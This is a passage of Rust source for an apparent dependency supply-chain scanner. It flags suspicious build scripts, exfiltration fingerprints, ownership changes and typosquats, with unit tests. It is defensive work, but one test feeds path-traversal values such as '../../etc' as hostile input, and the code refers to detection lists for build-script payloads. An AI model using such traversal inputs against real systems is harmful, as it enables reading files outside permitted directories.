        .iter()
        .copied()
        .filter(|m| content.contains(*m))
        .collect();
    let payload: Vec<&str> = BUILD_RS_PAYLOAD
        .iter()
        .copied()
        .filter(|m| content.contains(*m))
        .collect();

    if net.is_empty() && payload.is_empty() {
        return None;
    }

    let (severity, weight) = if !net.is_empty() {
        (Severity::High, 28)
    } else {
        (Severity::Medium, 16)
    };

    let mut evidence = vec![Evidence::with_path(
        "source",
        path,
        "build.rs shows anomalous intent (scanned statically, never executed)",
    )];
    if !net.is_empty() {
        evidence.push(Evidence::new(
            "heuristic",
            format!("network access in build script: {}", net.join(", ")),
        ));
    }
    if !payload.is_empty() {
        evidence.push(Evidence::new(
            "heuristic",
            format!("embedded payload / dynamic loading: {}", payload.join(", ")),
        ));
    }

    Some(RiskSignal {
        id: "build_script_suspicious".into(),
        package: package.to_string(),
        severity,
        weight,
        confidence: 0.8,
        evidence,
        recommendation:
            "A build script that reaches the network or unpacks an opaque payload is a known \
             malware vector. Manually review build.rs before building this crate."
                .into(),
    })
}

/// Ubiquitous, widely-audited platform/ecosystem crates. Their heuristic
/// findings (FFI name, build script, unsafe, duplicate versions) are kept for
/// transparency but contribute zero weight, so they never dominate the score.
/// Advisory matches against these crates are NEVER suppressed.
pub const KNOWN_GOOD_CRATES: &[&str] = &[
    // Core platform / std-adjacent
    "libc",
    "windows-sys",
    "windows-targets",
    "windows_aarch64_gnullvm",
    "windows_aarch64_msvc",
    "windows_i686_gnu",
    "windows_i686_gnullvm",
    "windows_i686_msvc",
    "windows_x86_64_gnu",
    "windows_x86_64_gnullvm",
    "windows_x86_64_msvc",
    "linux-raw-sys",
    "core-foundation-sys",
    "errno",
    // wasm / web
    "js-sys",
    "web-sys",
    "wasm-bindgen",
    "wasm-bindgen-backend",
    "wasm-bindgen-shared",
    // ubiquitous low-level utilities
    "bitflags",
    "cfg-if",
    "memchr",
    "once_cell",
    "smallvec",
    "rustix",
    "getrandom",
    // Legit, established crates (>=100k downloads) that sit one edit from a
    // popular crate; confirmed non-typosquats from a full crates.io db-dump scan.
    "base62",
    "bhttp",
    "boml",
    "byte",
    "cfg-iif",
    "chttp",
    "clamp",
    "cmac",
    "coap",
    "cuid",
    "ehttp",
    "ghash",
    "httm",
    "http2",
    "hyper2",
    "hyperx",
    "hypher",
    "idea",
    "index-map",
    "iter_tools",
    "lhash",
    "lib0",
    "libm",
    "manyhow",
    "mise",
    "nbytes",
    "nuid",
    "objekt",
    "ohttp",
    "openssh",
    "pastel",
    "pastey",
    "pasts",
    "ping",
    "pmac",
    "rbase64",
    "rend",
    "rinf",
    "rlibc",
    "rustis",
    "rxing",
    "serde_json5",
    "serde_yaml2",
    "serde_yml",
    "sha-1",
    "shaq",
    "socket",
    "str0m",
    "tdigest",
    "temp-file",
    "tide",
    "timer",
    "tokio-utils",
    "tomlq",
    "uguid",
    "ulid",
    "utime",
    "uuid7",
];

/// Whether a crate is on the built-in known-good baseline (case-sensitive,
/// matches crate names as they appear in `Cargo.lock`).
pub fn is_known_good(name: &str) -> bool {
    KNOWN_GOOD_CRATES.contains(&name)
}

/// Downgrade heuristic (non-advisory) findings for known-good crates to Info /
/// zero weight, appending a note. Advisory findings are left untouched.
fn apply_known_good_baseline(signals: &mut [RiskSignal]) {
    for signal in signals.iter_mut() {
        // Advisory matches, yanked status, *suspicious* build scripts, typosquats,
        // ownership changes and the malware / dependency-confusion source signals
        // are strong evidence, never suppressed by the baseline. Ownership change
        // and source substitution in particular MUST survive: the xz and
        // event-stream takeovers and dependency-confusion attacks all target
        // ubiquitous, "known-good" crates — silencing them there blinds the signal
        // to its main target.
        if signal.id.starts_with("advisory_")
            || signal.id == "yanked_crate"
            || signal.id == "build_script_suspicious"
            || signal.id == "suspicious_source_exfil"
            || signal.id == "suspicious_exfil_domain"
            || signal.id == "env_gated_payload"
            || signal.id == "possible_typosquat"
            || signal.id == "owners_changed"
            || signal.id == "source_substitution"
            || signal.id == "denied_crate"
        {
            continue;
        }
        let name = signal.package.split('@').next().unwrap_or(&signal.package);
        if is_known_good(name) {
            signal.severity = Severity::Info;
            signal.weight = 0;
            signal.evidence.push(Evidence::new(
                "baseline",
                "crate is on the rustinel known-good baseline (ubiquitous platform/ecosystem crate); not counted toward risk",
            ));
        }
    }
}

/// Read-only source/metadata scanning for crates we can find on disk.
fn collect_source_signals(
    lock: &LockfileModel,
    source_root: &Path,
    signals: &mut Vec<RiskSignal>,
) -> Result<(), RustinelError> {
    for package in lock.registry_packages() {
        let Some(crate_dir) = locate_crate_dir(source_root, package) else {
            continue;
        };

        // build.rs detection — file presence only, never executed.
        let build_rs = crate_dir.join("build.rs");
        if build_rs.is_file() {
            signals.push(RiskSignal {
                id: "build_script_present".into(),
                package: package.id.to_string(),
                // Presence of a build script is ubiquitous and informational; the
                // *intent* scan (build_script_suspicious) carries the real weight.
                severity: Severity::Low,
                weight: 2,
                confidence: 0.95,
                evidence: vec![Evidence::with_path(
                    "file",
                    rel_display(source_root, &build_rs),
                    "build.rs exists; the file was inspected statically and never executed",
                )],
                recommendation: "Review the build script before merging.".into(),
            });

            // Static *intent* scan of the build script. A build.rs that reaches
            // the network or embeds an opaque payload is highly anomalous and is
            // the exact vector used by recent malicious crates — never executed,
            // only read.
            if let Some(content) =
                crate::safety::read_file_capped(&build_rs, crate::safety::MAX_SOURCE_FILE_BYTES)
            {
                if let Some(sig) = build_script_intent_signal(
                    &package.id.to_string(),
                    &content,
                    rel_display(source_root, &build_rs),
                ) {
                    signals.push(sig);
                }
            }
        }

        // Manifest signals: native `links`, declared license.
        let manifest = crate_dir.join("Cargo.toml");
        if let Some(meta) = read_manifest(&manifest) {
            if let Some(links) = meta.links {
                // Manifest-confirmed native linkage is a stronger signal than the
                // name heuristic: escalate severity/weight and confidence.
                if let Some(existing) = signals
                    .iter_mut()
                    .find(|s| s.id == "native_ffi_detected" && s.package == package.id.to_string())
                {
                    existing.severity = Severity::Medium;
                    existing.weight = 14;
                    existing.confidence = 0.95;
                    existing.evidence.push(Evidence::with_path(
                        "manifest",
                        rel_display(source_root, &manifest),
                        format!("manifest declares `links = \"{links}\"`"),
                    ));
                } else {
                    signals.push(RiskSignal {
                        id: "native_ffi_detected".into(),
                        package: package.id.to_string(),
                        severity: Severity::Medium,
                        weight: 14,
                        confidence: 0.9,
                        evidence: vec![Evidence::with_path(
                            "manifest",
                            rel_display(source_root, &manifest),
                            format!("manifest declares `links = \"{links}\"`"),
                        )],
                        recommendation:
                            "Review the native dependency and its build process before merging."
                                .into(),
                    });
                }
            }

            signals.push(license_signal(
                package,
                meta.license.as_deref(),
                &manifest,
                source_root,
            ));
        }

        // unsafe usage — static, comment/string-aware count across src/*.rs.
        // `unsafe` is ubiquitous and is NOT a vulnerability by itself, so it
        // carries little score weight (cargo-geiger philosophy); it stays visible.
        if let Some((stats, sample)) = count_unsafe(&crate_dir) {
            if stats.total > 0 {
                let (severity, weight) = if stats.total >= 20 {
                    (Severity::Low, 3)
                } else {
                    (Severity::Low, 1)
                };
                signals.push(RiskSignal {
                    id: "unsafe_present".into(),
                    package: package.id.to_string(),
                    severity,
                    weight,
                    confidence: 0.8,
                    evidence: vec![Evidence::with_path(
                        "source",
                        rel_display(source_root, &sample),
                        format!(
                            "{} `unsafe` usage(s) found by static scan (comments and strings ignored). \
                             Use of `unsafe` is not automatically a vulnerability; it indicates code that warrants review.",
                            stats.breakdown()
                        ),
                    )],
                    recommendation:
                        "Confirm that `unsafe` blocks are justified and reviewed. This is informational, not a vulnerability."
                            .into(),
                });
            }
        }

        // Runtime secret-exfiltration fingerprint (faster_log/async_println class).
        // Each signal cites its OWN matching file (scan.*_sample), not one shared
        // path — otherwise an env-gated payload in file B could be attributed to
        // file A which merely held the exfil domain.
        if let Some(scan) = scan_source_exfil(&crate_dir) {
            if let Some(s) = &scan.source_exfil_sample {
                signals.push(source_exfil_signal(
                    &package.id.to_string(),
                    scan.source_exfil_network,
                    scan.source_exfil_secrets,
                    rel_display(source_root, s),
                ));
            }
            // Exfil-domain reputation: fires even when the crate does not read the
            // project's `.rs` files (faster_log harvested *log* files).
            if let (Some(domain), Some(s)) = (scan.exfil_domain.as_deref(), &scan.domain_sample) {
                signals.push(exfil_domain_signal(
                    &package.id.to_string(),
                    domain,
                    rel_display(source_root, s),
                ));
            }
            // Env-gated remote payload (rustdecimal, 2022): env var + network + spawn.
            if let Some(s) = &scan.env_gated_sample {
                signals.push(env_gated_payload_signal(
                    &package.id.to_string(),
                    rel_display(source_root, s),
                ));
            }
        }
    }
    Ok(())
}

fn license_signal(
    package: &Package,
    license: Option<&str>,
    manifest: &Path,
    source_root: &Path,
) -> RiskSignal {
    match license {
        Some(license) => RiskSignal {
            id: "license_detected".into(),
            package: package.id.to_string(),
            severity: Severity::Info,
            weight: 0,
            confidence: 1.0,
            evidence: vec![Evidence::with_path(
                "manifest",
                rel_display(source_root, manifest),
                format!("declared license: {license}"),
            )],
            recommendation: "Confirm the license is allowed by your organization policy.".into(),
        },
        None => RiskSignal {
            id: "license_unknown".into(),
            package: package.id.to_string(),
            severity: Severity::Low,
            weight: 4,
            confidence: 0.9,
            evidence: vec![Evidence::with_path(
                "manifest",
                rel_display(source_root, manifest),
                "no `license` or `license-file` field found in the manifest",
            )],
            recommendation: "Determine the crate's license before depending on it.".into(),
        },
    }
}

/// Minimal manifest fields we care about. Parsed read-only.
struct ManifestMeta {
    links: Option<String>,
    license: Option<String>,
}

fn read_manifest(path: &Path) -> Option<ManifestMeta> {
    let content = crate::safety::read_file_capped(path, crate::safety::MAX_SOURCE_FILE_BYTES)?;
    let value: toml::Value = toml::from_str(&content).ok()?;
    let package = value.get("package")?;
    let links = package
        .get("links")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());
    let license = package
        .get("license")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())
        .or_else(|| {
            package
                .get("license-file")
                .and_then(|v| v.as_str())
                .map(|f| format!("file:{f}"))
        });
    Some(ManifestMeta { links, license })
}

/// Count `unsafe` tokens across the crate's `src` tree. Returns the count plus a
/// representative file for evidence.
///
/// Hardened traversal: symlinks are never followed (so an attacker-planted
/// symlink cannot redirect the scan to `/etc/shadow`), recursion depth and
/// total entries are bounded, and each file read is size-capped.
fn count_unsafe(crate_dir: &Path) -> Option<(UnsafeStats, PathBuf)> {
    use crate::safety::{MAX_DIR_DEPTH, MAX_DIR_ENTRIES, MAX_SOURCE_FILE_BYTES};

    let mut total = UnsafeStats::default();
    let mut sample: Option<PathBuf> = None;
    // (dir, depth)
    let mut stack: Vec<(PathBuf, usize)> = if crate_dir.join("src").is_dir() {
        vec![(crate_dir.join("src"), 0)]
    } else {
        vec![(crate_dir.to_path_buf(), 0)]
    };

    let mut visited = 0usize;
    while let Some((dir, depth)) = stack.pop() {
        for entry in sorted_dir_entries(&dir) {
            if visited >= MAX_DIR_ENTRIES {
                return sample.map(|s| (total, s));
            }
            visited += 1;
            // file_type() from a DirEntry does NOT follow symlinks.
            let Ok(ft) = entry.file_type() else { continue };
            if ft.is_symlink() {
                continue; // never traverse or read through symlinks
            }
            let path = entry.path();
            if ft.is_dir() {
                if depth < MAX_DIR_DEPTH {
                    stack.push((path, depth + 1));
                }
                continue;
            }
            if ft.is_file() && path.extension().and_then(|e| e.to_str()) == Some("rs") {
                if let Some(content) = crate::safety::read_file_capped(&path, MAX_SOURCE_FILE_BYTES)
                {
                    let stats = scan_unsafe(&content);
                    if stats.total > 0 {
                        if sample.is_none() {
                            sample = Some(path.clone());
                        }
                        total.add(&stats);
                    }
                }
            }
        }
    }
    sample.map(|s| (total, s))
}

/// Breakdown of `unsafe` usage, so the finding can *contextualize* rather than
/// just count (a gap noted vs cargo-geiger).
#[derive(Debug, Default, Clone, Copy)]
pub(crate) struct UnsafeStats {
    total: usize,
    fns: usize,
    impls: usize,
    traits: usize,
    blocks: usize,
}

impl UnsafeStats {
    fn add(&mut self, o: &UnsafeStats) {
        self.total += o.total;
        self.fns += o.fns;
        self.impls += o.impls;
        self.traits += o.traits;
        self.blocks += o.blocks;
    }

    /// "12 (3 fn, 1 impl, 8 block)" style breakdown.
    fn breakdown(&self) -> String {
        let mut parts = Vec::new();
        if self.fns > 0 {
            parts.push(format!("{} fn", self.fns));
        }
        if self.impls > 0 {
            parts.push(format!("{} impl", self.impls));
        }
        if self.traits > 0 {
            parts.push(format!("{} trait", self.traits));
        }
        if self.blocks > 0 {
            parts.push(format!("{} block", self.blocks));
        }
        if parts.is_empty() {
            self.total.to_string()
        } else {
            format!("{} ({})", self.total, parts.join(", "))
        }
    }
}

/// Count `unsafe` keywords in real code, ignoring comments and string/raw-string
/// literals (so `unsafe` in a doc comment or string is not counted), and
/// categorize each by the construct that follows (`fn`/`impl`/`trait`/block).
///
/// A small hand lexer — deliberately not a full parser, never executes anything,
/// and is bounded by the caller's file-size cap. Unrecognized exotic syntax can
/// only mis-count slightly; it can never panic.
pub(crate) fn scan_unsafe(src: &str) -> UnsafeStats {
    let b = src.as_bytes();
    let n = b.len();
    let mut stats = UnsafeStats::default();
    let mut i = 0;

    enum State {
        Normal,
        Line,
        Block(usize),
        Str,
        Raw(usize),
    }
    let mut st = State::Normal;

    while i < n {
        match st {
            State::Normal => {
                if b[i] == b'/' && i + 1 < n && b[i + 1] == b'/' {
                    st = State::Line;
                    i += 2;
                } else if b[i] == b'/' && i + 1 < n && b[i + 1] == b'*' {
                    st = State::Block(1);
                    i += 2;
                } else if let Some((hashes, skip)) = raw_string_start(b, i) {
                    st = State::Raw(hashes);
                    i += skip;
                } else if b[i] == b'"' {
                    st = State::Str;
                    i += 1;
                } else if b[i] == b'\'' {
                    i += char_literal_len(b, i); // skip char literals (>=1)
                } else if b[i] == b'u' && matches_unsafe(b, i) {
                    stats.total += 1;
                    categorize(b, i + 6, &mut stats);
                    i += 6;
                } else {
                    i += 1;
                }
            }
            State::Line => {
                if b[i] == b'\n' {
                    st = State::Normal;
                }
                i += 1;
            }
            State::Block(d) => {
                if b[i] == b'/' && i + 1 < n && b[i + 1] == b'*' {
                    st = State::Block(d + 1);
                    i += 2;
                } else if b[i] == b'*' && i + 1 < n && b[i + 1] == b'/' {
                    st = if d == 1 {
                        State::Normal
                    } else {
                        State::Block(d - 1)
                    };
                    i += 2;
                } else {
                    i += 1;
                }
            }
            State::Str => {
                if b[i] == b'\\' {
                    i += 2;
                } else {
                    if b[i] == b'"' {
                        st = State::Normal;
                    }
                    i += 1;
                }
            }
            State::Raw(h) => {
                if b[i] == b'"' && i + 1 + h <= n && b[i + 1..i + 1 + h].iter().all(|&c| c == b'#')
                {
                    st = State::Normal;
                    i += 1 + h;
                } else {
                    i += 1;
                }
            }
        }
    }
    stats
}

/// `unsafe` as a whole word at position `i`.
fn matches_unsafe(b: &[u8], i: usize) -> bool {
    if i + 6 > b.len() || &b[i..i + 6] != b"unsafe" {
        return false;
    }
    let before_ok = i == 0 || !is_ident_byte(b[i - 1]);
    let after_ok = i + 6 >= b.len() || !is_ident_byte(b[i + 6]);
    before_ok && after_ok
}

/// Classify the construct after an `unsafe` keyword (whitespace-skipped).
fn categorize(b: &[u8], mut j: usize, stats: &mut UnsafeStats) {
    while j < b.len() && b[j].is_ascii_whitespace() {
        j += 1;
    }
    let starts = |kw: &[u8]| -> bool {
        j + kw.len() <= b.len()
            && &b[j..j + kw.len()] == kw
            && (j + kw.len() == b.len() || !is_ident_byte(b[j + kw.len()]))
    };
    if starts(b"fn") {
        stats.fns += 1;
    } else if starts(b"impl") {
        stats.impls += 1;
    } else if starts(b"trait") {
        stats.traits += 1;
    } else {
        stats.blocks += 1;
    }
}

/// If a raw-string literal (`r"`, `r#"`, `br##"`, …) starts at `i`, return its
/// hash count and the number of bytes to skip to land after the opening quote.
fn raw_string_start(b: &[u8], i: usize) -> Option<(usize, usize)> {
    // Must be a token start: preceded by a non-identifier byte.
    if i > 0 && is_ident_byte(b[i - 1]) {
        return None;
    }
    let mut p = i;
    if b.get(p) == Some(&b'b') {
        p += 1; // byte raw string
    }
    if b.get(p) != Some(&b'r') {
        return None;
    }
    p += 1;
    let hash_start = p;
    while b.get(p) == Some(&b'#') {
        p += 1;
    }
    if b.get(p) == Some(&b'"') {
        let hashes = p - hash_start;
        Some((hashes, p - i + 1)) // skip through the opening quote
    } else {
        None
    }
}

/// Byte length of a char literal starting at `i` (`'a'`, `'\n'`, `'\u{1F}'`),
/// or 1 if it's actually a lifetime (`'a`) / not a literal — so the caller
/// always advances.
fn char_literal_len(b: &[u8], i: usize) -> usize {
    // b[i] == '\''
    if b.get(i + 1) == Some(&b'\\') {
        // escaped: find the closing quote within a bounded window
        let mut p = i + 2;
        let end = (i + 12).min(b.len());
        while p < end {
            if b[p] == b'\'' {
                return p - i + 1;
            }
            p += 1;
        }
        1
    } else if b.get(i + 2) == Some(&b'\'') && b.get(i + 1) != Some(&b'\'') {
        3 // simple 'X'
    } else {
        1 // lifetime or unknown
    }
}

fn is_ident_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

/// Find a crate's on-disk directory under a source root, supporting both the
/// flat fixture layout (`<root>/<name>-<version>`) and the real Cargo registry
/// src layout (`<root>/<registry>/<name>-<version>`).
///
/// Hardened against path traversal: the crate name and version come from an
/// untrusted lockfile, so they are validated to be safe single path segments
/// (no `/`, `\`, `..`, NUL) and the resolved directory is verified to be
/// canonically contained within `source_root`.
fn locate_crate_dir(source_root: &Path, package: &Package) -> Option<PathBuf> {
    use crate::safety::{
        is_contained_within, is_safe_crate_name, is_safe_path_segment, is_safe_version,
    };

    if !is_safe_crate_name(&package.id.name) || !is_safe_version(&package.id.version) {
        return None;
    }
    let dir_name = format!("{}-{}", package.id.name, package.id.version);
    if !is_safe_path_segment(&dir_name) {
        return None;
    }

    let verify = |candidate: PathBuf| -> Option<PathBuf> {
        // Must be a real directory (not a symlink) AND inside source_root.
        let meta = std::fs::symlink_metadata(&candidate).ok()?;
        if !meta.file_type().is_dir() {
            return None;
        }
        if is_contained_within(source_root, &candidate) {
            Some(candidate)
        } else {
            None
        }
    };

    if let Some(dir) = verify(source_root.join(&dir_name)) {
        return Some(dir);
    }
    // One level of nesting (e.g. registry index hash dir). Sorted so that, if the
    // same `name-version` dir exists under more than one nesting parent (e.g. two
    // registry index hashes), the chosen crate dir — and thus every evidence path
    // derived from it — is reproducible across filesystems.
    for entry in sorted_dir_entries(source_root) {
        let Ok(ft) = entry.file_type() else { continue };
        if !ft.is_dir() {
            continue; // skip symlinks and files
        }
        if let Some(dir) = verify(entry.path().join(&dir_name)) {
            return Some(dir);
        }
    }
    None
}

fn rel_display(root: &Path, path: &Path) -> String {
    path.strip_prefix(root)
        .unwrap_or(path)
        .display()
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::lockfile::PackageId;

    fn pkg(name: &str, version: &str, local: bool) -> Package {
        Package {
            id: PackageId {
                name: name.into(),
                version: version.into(),
                source: if local {
                    None
                } else {
                    Some("registry+https://github.com/rust-lang/crates.io-index".into())
                },
            },
            checksum: None,
            dependencies: vec![],
        }
    }

    fn lock(packages: Vec<Package>) -> LockfileModel {
        LockfileModel {
            path: PathBuf::from("Cargo.lock"),
            version: Some(3),
            packages,
        }
    }

    fn opts_with_meta(pairs: &[(&str, crate::CrateMetadata)]) -> AnalysisOptions {
        let mut metadata = std::collections::BTreeMap::new();
        for (k, m) in pairs {
            metadata.insert((*k).to_string(), m.clone());
        }
        AnalysisOptions {
            metadata,
            ..Default::default()
        }
    }

    #[test]
    fn typosquat_cleared_by_high_downloads() {
        // `miow` is one edit from `mio` but is a legitimate, widely-used crate
        // (53M downloads). High adoption must suppress the typosquat flag.
        let lk = lock(vec![pkg("miow", "0.6.1", false)]);
        let opts = opts_with_meta(&[(
            "miow@0.6.1",
            crate::CrateMetadata {
                total_downloads: Some(53_000_000),
                ..Default::default()
            },
        )]);
        let mut sig = vec![];
        collect_typosquat(&lk, &opts, &mut sig);
        assert!(
            sig.iter().all(|s| s.id != "possible_typosquat"),
            "established crate must not be flagged as a typosquat"
        );
    }

    #[test]
    fn typosquat_flagged_when_obscure() {
        // A name one edit from `mio` with almost no downloads IS a suspect.
        let lk = lock(vec![pkg("miow", "0.0.1", false)]);
        let opts = opts_with_meta(&[(
            "miow@0.0.1",
            crate::CrateMetadata {
                total_downloads: Some(42),
                ..Default::default()
            },
        )]);
        let mut sig = vec![];
        collect_typosquat(&lk, &opts, &mut sig);
        let f = sig
            .iter()
            .find(|s| s.id == "possible_typosquat")
            .expect("obscure look-alike must be flagged");
        assert_eq!(f.severity, Severity::Medium);
    }

    #[test]
    fn typosquat_offline_is_quiet_info() {
        // Without metadata we cannot corroborate, so emit a quiet Info hint, never
        // a misleading Medium finding (the `miow` false-positive regression).
        let lk = lock(vec![pkg("miow", "0.6.1", false)]);
        let opts = AnalysisOptions::default();
        let mut sig = vec![];
        collect_typosquat(&lk, &opts, &mut sig);
        let f = sig
            .iter()
            .find(|s| s.id == "possible_typosquat")
            .expect("offline hint present");
        assert_eq!(f.severity, Severity::Info);
    }

    #[test]
    fn freshness_flags_only_recent_versions() {
        let lk = lock(vec![pkg("somecrate", "1.0.0", false)]);
        let fresh = opts_with_meta(&[(
            "somecrate@1.0.0",
            crate::CrateMetadata {
                published_days_ago: Some(3),
                ..Default::default()
            },
        )]);
        let mut sig = vec![];
        collect_freshness(&lk, &fresh, &mut sig);
        assert_eq!(
            sig.iter().filter(|s| s.id == "freshly_published").count(),
            1,
            "a 3-day-old version must be flagged fresh"
        );

        let old = opts_with_meta(&[(
            "somecrate@1.0.0",
            crate::CrateMetadata {
                published_days_ago: Some(400),
                ..Default::default()
            },
        )]);
        let mut sig2 = vec![];
        collect_freshness(&lk, &old, &mut sig2);
        assert!(sig2.is_empty(), "an old version must not be flagged fresh");
    }

    fn opts_with_owners(meta: &[(&str, &[&str])], trusted: &[(&str, &[&str])]) -> AnalysisOptions {
        let mut metadata = std::collections::BTreeMap::new();
        for (k, owners) in meta {
            metadata.insert(
                (*k).to_string(),
                crate::CrateMetadata {
                    owners: owners.iter().map(|s| s.to_string()).collect(),
                    ..Default::default()
                },
            );
        }
        let mut trusted_owners = std::collections::BTreeMap::new();
        for (k, owners) in trusted {
            trusted_owners.insert(
                (*k).to_string(),
                owners.iter().map(|s| s.to_string()).collect(),
            );
        }
        AnalysisOptions {
            metadata,
            trusted_owners,
            ..Default::default()
        }
    }

    #[test]
    fn owners_changed_flags_new_maintainer() {
        // The xz scenario: trusted owner set was [Lasse]; it is now [Lasse, JiaT75]
        // — a new maintainer appeared. That must be flagged.
        let lk = lock(vec![pkg("xz2", "0.1.7", false)]);
        let opts = opts_with_owners(
            &[("xz2@0.1.7", &["Lasse", "JiaT75"])],
            &[("xz2", &["Lasse"])],
        );
        let mut sig = vec![];
        collect_owners_changed(&lk, &opts, &mut sig);
        let f = sig
            .iter()
            .find(|s| s.id == "owners_changed")
            .expect("a new maintainer must be flagged");
        assert_eq!(f.severity, Severity::Medium);
        assert!(f.evidence[0].summary.contains("JiaT75"));
    }

    #[test]
    fn owners_unchanged_emits_nothing() {
        let lk = lock(vec![pkg("serde", "1.0.0", false)]);
        let opts = opts_with_owners(&[("serde@1.0.0", &["dtolnay"])], &[("serde", &["dtolnay"])]);
        let mut sig = vec![];
        collect_owners_changed(&lk, &opts, &mut sig);
        assert!(sig.is_empty(), "unchanged owners must not be flagged");
    }

    #[test]
    fn owners_without_baseline_emits_nothing() {
        // No baseline means no reference point — we cannot (and must not) claim a
        // change. Trust is established first, detected second.
        let lk = lock(vec![pkg("serde", "1.0.0", false)]);
        let opts = opts_with_owners(&[("serde@1.0.0", &["newowner"])], &[]);
        let mut sig = vec![];
        collect_owners_changed(&lk, &opts, &mut sig);
        assert!(sig.is_empty(), "no baseline -> no signal");
    }

    #[test]
    fn owners_changed_survives_known_good_baseline() {
        // The xz / event-stream takeovers hit ubiquitous, "known-good" crates, so
        // an ownership change there must NOT be downgraded by the baseline.
        assert!(is_known_good("libc"), "test premise: libc is known-good");
        let lk = lock(vec![pkg("libc", "0.2.0", false)]);
        let opts = opts_with_owners(
            &[("libc@0.2.0", &["alice", "mallory"])],
            &[("libc", &["alice"])],
        );
        let signals = collect_basic_signals(&lk, &opts).unwrap();
        let f = signals
            .iter()
            .find(|s| s.id == "owners_changed")
            .expect("owners_changed present");
        assert_eq!(
            f.severity,
            Severity::Medium,
            "ownership change must survive the known-good baseline"
        );
        assert!(f.weight > 0, "must still count toward risk");
    }

    #[test]
    fn owners_changed_detected_on_later_version_without_first_metadata() {
        // Lower version has no owner metadata; the higher one has a changed owner
        // set. The change must still be detected (no dedup short-circuit).
        let lk = lock(vec![
            pkg("foo-crate", "1.0.0", false),
            pkg("foo-crate", "2.0.0", false),
        ]);
        let opts = opts_with_owners(
            &[("foo-crate@2.0.0", &["alice", "newowner"])],
            &[("foo-crate", &["alice"])],
        );
        let mut sig = vec![];
        collect_owners_changed(&lk, &opts, &mut sig);
        assert_eq!(
            sig.iter().filter(|s| s.id == "owners_changed").count(),
            1,
            "ownership change on a non-first version must be detected"
        );
    }

    #[test]
    fn locate_crate_dir_rejects_path_traversal() {
        // A hostile lockfile cannot make us resolve a directory outside the root.
        let root = std::env::temp_dir();
        for evil in ["../../etc", "..", "foo/bar", "a/../../b"] {
            let p = pkg(evil, "1.0.0", false);
            assert!(
                locate_crate_dir(&root, &p).is_none(),
                "traversal name {evil:?} must be refused"
            );
        }
        // A hostile version string is likewise refused.
        let p = pkg("serde", "../../etc", false);
        assert!(locate_crate_dir(&root, &p).is_none());
    }

    #[test]
    fn detects_native_ffi_by_name() {
        let model = lock(vec![pkg("openssl-sys", "0.9.99", false)]);
        let mut signals = vec![];
        collect_name_heuristics(&model, &mut signals);
        assert!(signals.iter().any(|s| s.id == "native_ffi_detected"));
        let s = signals
            .iter()
            .find(|s| s.id == "native_ffi_detected")
            .unwrap();
        // Name-only FFI is a weak signal: Low severity, modest confidence.
        assert_eq!(s.severity, Severity::Low);
        assert!(s.confidence >= 0.5);
    }

    #[test]
    fn known_good_crate_downgraded_to_baseline() {
        let model = lock(vec![pkg("windows-sys", "0.61.2", false)]);
        let signals = collect_basic_signals(&model, &AnalysisOptions::default()).unwrap();
        let ffi = signals
            .iter()
            .find(|s| s.id == "native_ffi_detected")
            .expect("signal kept for transparency");
        assert_eq!(ffi.severity, Severity::Info);
        assert_eq!(ffi.weight, 0);
        assert!(ffi.evidence.iter().any(|e| e.kind == "baseline"));
        assert!(is_known_good("windows-sys"));
        assert!(!is_known_good("openssl-sys"));
    }

    #[test]
    fn local_crate_not_flagged_for_ffi() {
        let model = lock(vec![pkg("my-app-sys", "0.1.0", true)]);
        let mut signals = vec![];
        collect_name_heuristics(&model, &mut signals);
        assert!(signals.is_empty());
    }

    #[test]
    fn damerau_levenshtein_basics() {
        assert_eq!(damerau_levenshtein("serde", "serde"), 0);
        assert_eq!(damerau_levenshtein("serde", "serdf"), 1); // substitution
        assert_eq!(damerau_levenshtein("tokio", "tokoi"), 1); // transposition
        assert_eq!(damerau_levenshtein("reqwest", "reqwes"), 1); // deletion
        assert_eq!(damerau_levenshtein("serde", "serde_json"), 5);
    }

    #[test]
    fn detects_typosquat_one_edit_away() {
        let model = lock(vec![pkg("reqwset", "1.0.0", false)]); // transposition of reqwest
        let mut signals = vec![];
        collect_typosquat(&model, &AnalysisOptions::default(), &mut signals);
        let s = signals
            .iter()
            .find(|s| s.id == "possible_typosquat")
            .unwrap();
        assert!(s.evidence[0].summary.contains("reqwest"));
    }

    #[test]
    fn does_not_flag_legitimate_crates() {
        // Real crates that merely resemble popular ones are far in edit distance.
        let model = lock(vec![
            pkg("serde_json", "1.0.0", false),
            pkg("tokio-util", "0.7.0", false),
            pkg("my-app-utils", "0.1.0", false),
            pkg("serde", "1.0.0", false), // exact popular -> not flagged
        ]);
        let mut signals = vec![];
        collect_typosquat(&model, &AnalysisOptions::default(), &mut signals);
        assert!(signals.is_empty(), "false positives: {signals:?}");
    }

    #[test]
    fn legit_lookalikes_are_not_typosquats() {
        // Real, widely-used crates that sit one edit away from a popular crate
        // (`mime`↔`time`, `md-5`↔`md5`, `anes`↔`aes`). Regression for a corpus
        // scan that mis-flagged all three as typosquats.
        let model = lock(vec![
            pkg("mime", "0.3.17", false),
            pkg("md-5", "0.10.6", false),
            pkg("anes", "0.1.6", false),
        ]);
        let mut signals = vec![];
        collect_typosquat(&model, &AnalysisOptions::default(), &mut signals);
        assert!(signals.is_empty(), "false positives: {signals:?}");
    }

    /// Build a throwaway crate dir under the temp dir with the given
    /// `relative-path -> contents` files inside a `src/` tree. Returned guard
    /// removes the dir on drop. No external crates (no `tempfile`).
    fn scratch_crate(tag: &str, files: &[(&str, &str)]) -> PathBuf {
        let root = std::env::temp_dir().join(format!(
            "rustinel_exfil_{}_{}_{}",
            tag,
            std::process::id(),
            files.len()
        ));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(root.join("src")).unwrap();
        for (rel, body) in files {
            let p = root.join("src").join(rel);
            if let Some(parent) = p.parent() {
                std::fs::create_dir_all(parent).unwrap();
            }
            std::fs::write(&p, body).unwrap();
        }
        root
    }

    #[test]
    fn source_exfil_signal_builds_high() {
        // The signal builder always fires once the caller has confirmed the
        // per-file conjunction; it just renders the `what` prose.
        let sig = source_exfil_signal("x@1", false, true, "lib.rs".into());
        assert_eq!(sig.id, "suspicious_source_exfil");
        assert_eq!(sig.severity, Severity::High);
        assert!(sig
            .evidence
            .iter()
            .any(|e| e.summary.contains("wallet/private-key")));
        let sig = source_exfil_signal("x@1", true, false, "lib.rs".into());
        assert!(sig
            .evidence
            .iter()
            .any(|e| e.summary.contains("exfiltrates over the network")));
    }

